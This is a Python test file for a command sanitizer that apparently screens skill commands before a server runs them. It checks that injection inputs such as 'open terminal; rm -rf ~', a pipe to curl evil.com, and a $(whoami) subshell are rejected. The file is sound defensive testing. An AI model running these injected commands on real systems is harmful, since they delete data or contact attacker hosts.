import sys
sys.path.insert(0, ".")
from server import sanitize_skill_command

def test_sanitizer():
    # 1. Normal safe command
    ok, cmd, err = sanitize_skill_command("set timer for 10 min for tea")
    assert ok and cmd == "set timer for 10 min for tea" and not err
    print("✓ Normal command allowed")

    # 2. Too long command (>150 chars)
    long_cmd = "a" * 155
    ok, cmd, err = sanitize_skill_command(long_cmd)
    assert not ok and "exceeds safety limit" in err
    print("✓ Overlong command rejected")

    # 3. Metacharacter injection: semicolon
    ok, cmd, err = sanitize_skill_command("open terminal; rm -rf ~")
    assert not ok and "forbidden shell metacharacter ';'" in err
    print("✓ Semicolon injection rejected")

    # 4. Metacharacter injection: pipe / background
    ok, cmd, err = sanitize_skill_command("open terminal | curl evil.com &")
    assert not ok
    print("✓ Pipe & ampersand rejected")

    # 5. Subshell syntax
    ok, cmd, err = sanitize_skill_command("echo $(whoami)")
    assert not ok
    print("✓ Subshell syntax rejected")

    print("\n🎉 ALL SANITIZATION TESTS PASSED!")

if __name__ == "__main__":
    test_sanitizer()
